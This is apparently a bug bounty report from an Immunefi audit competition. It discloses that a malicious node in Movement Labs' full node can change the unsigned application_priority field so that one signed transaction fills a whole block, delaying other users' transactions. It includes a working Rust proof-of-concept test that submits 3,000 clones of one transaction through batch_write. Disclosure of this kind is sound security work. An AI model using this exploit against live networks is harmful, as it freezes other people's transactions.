# #42648 \[BC-High] Altering the application\_priority to fill a block, temporary freezing user transactions

**Submitted on Mar 25th 2025 at 07:32:08 UTC by @Capybara for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42648
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/networks/movement/movement-full-node>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments

## Description

## Summary

A malicious node can alter the `application_priority` of a valid transaction to make the sequencer build and sequence to other nodes a block filled with transactions that can't be executed, temporarily freezing other network transactions by delaying them.

## Details

The `application_priority` is one of the values used to generate the **key** for storing a transaction in the mempool:

```
fn construct_mempool_transaction_key(transaction: &MempoolTransaction) -> Result<String, Error> {
	// Pre-allocate a string with the required capacity
	let mut key = String::with_capacity(32 + 1 + 32 + 1 + 32 + 1 + 32);
	// Write key components. The numbers are zero-padded to 32 characters.
	key.write_fmt(format_args!(
		"{:032}:{:032}:{:032}:{}",
		transaction.transaction.application_priority(),
		transaction.timestamp,
		transaction.transaction.sequence_number(),
		transaction.transaction.id(),
	))
	.map_err(|_| Error::msg("Error writing mempool transaction key"))?;
	Ok(key)
}
```

> <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/mempool/move-rocks/src/lib.rs#L23-L36>

The `application_priority` is not signed by the user submitting the transaction; instead, the node controls its value.

The attack vector becomes possible when a node can freely control any values used to generate a **key** to store a transaction in the mempool.

When writing a batch of transactions using `batch_write(...)`, the algorithm:

* Checks if the transaction ID is already in the pool
* If the transaction is not in the pool, it generates a `key` using the malleable `application_priority` parameter
* Adds the transaction to an atomic write, but the atomic write is not yet executed.
* If the same transaction id is encountered in the *loop*, it "*should*" generate the same `key`, so instead of inserting a new atomic write it overrides the previous one.

```
            ┌─────┐                  
            │START│                  
            └──┬──┘                  
               │                     
               │◁───────────────────╮
       ________│_________           │
      ╱                  ╲    ┌────┐│
     ╱ Is the transaction ╲___│Skip││
     ╲ ID in the pool?    ╱yes└──┬─┘│
      ╲__________________╱       │  │
               │no               │  │
         ┌─────▽─────┐           │  │
         │Generate a │           │  │
         │mempool KEY│           │  │
         └─────┬─────┘           │  │
┌──────────────▽─────────────┐   │  │
│Add transaction to a pending│   │  │
│atomic write using the KEY  │   │  │
└──────────────┬─────────────┘   │  │
               └────┬────────────┘  │
            ________▽_________      │
           ╱                  ╲     │
          ╱ More transactions? ╲____│
          ╲                    ╱yes  
           ╲__________________╱      
                    │no              
             ┌──────▽─────┐          
             │Commit the  │          
             │atomic write│          
             └────────────┘          
```

Unfortunately, as one of the parameters used to generate the keys are unsigned and can be controlled by the node, it is possible to batch\_write the same transaction multiple times but with a different value for `application_priority`.

As a result, a different `key` is generated every time, resulting in the same transaction filling all block spots.

When the block is produced, filled with the same transaction multiple times, and sequenced to other nodes, only 1 of these transactions will be executed, and others will error. However, the malicious node could delay all other user transactions when he fills a block with only one.

## Impact

Temporarily freezing other network transactions by delaying them.

## Proof of Concept

## Proof of Concept

Add the following test to `/attackathon-movement/protocol-units/da/movement/protocol/tests/src/test/e2e/raw/sequencer.rs`

It takes 1 valid user transaction, and generates 3\_000 clones with a different `application_priority` each.

The sequencer will create blocks with all 3\_000 transactions, then sequence them to the nodes, and only 1 will be executed.

```
#[tokio::test]
async fn test_malleable_application_priority() -> Result<(), anyhow::Error> {
    let mut client = LightNodeServiceClient::connect("http://0.0.0.0:30730").await?;

    // Create accounts
    let alice = LocalAccount::generate(&mut rand::rngs::OsRng);
    let bob = LocalAccount::generate(&mut rand::rngs::OsRng);

    println!("alice address: {:?}", alice.address());
    println!("bob address: {:?}", bob.address());

    // Fund account
    let faucet_client = FaucetClient::new(Url::parse("http://0.0.0.0:30732").expect("reason"), Url::parse("http://0.0.0.0:30731").expect("reason"));
    faucet_client.fund(alice.address(), 1_000_000).await.expect("Failed to fund sender account");
    faucet_client.fund(bob.address(), 1_000_000).await.expect("Failed to fund Bob's account");

    // Create txs
    let amount: u64 = 100_000;
    let coin = TypeTag::from_str("0x1::aptos_coin::AptosCoin").expect("");
    let transaction_builder = TransactionBuilder::new(
        TransactionPayload::EntryFunction(EntryFunction::new(
            ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
            Identifier::new("transfer")?,
            vec![coin.clone()],
            vec![to_bytes(&bob.address())?, to_bytes(&amount)?],
        )),
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 200,
        ChainId::new(27u8),
    )
        .sender(alice.address())
        .sequence_number(0)
        .max_gas_amount(5_000)
        .gas_unit_price(100);
 
    // create the blob write
    let signed_transaction = alice.sign_with_transaction_builder(transaction_builder);
    let txn_hash = signed_transaction.committed_hash();
    let mut transactions = vec![];
    let serialized_aptos_transaction = bcs::to_bytes(&signed_transaction)?;
    for i in 0..3_000 {
        let mut movement_transaction1 = Transaction::new(
            serialized_aptos_transaction.clone(),
            i.clone(),
            0,
        );
        let serialized_transaction1 = serde_json::to_vec(&movement_transaction1)?;
        transactions.push(BlobWrite { data: serialized_transaction1 });
    }

    let batch_write = BatchWriteRequest { blobs: transactions };

    // write the batch to the DA
    let batch_write_reponse = client.batch_write(batch_write).await?;

    Ok(())
}
```
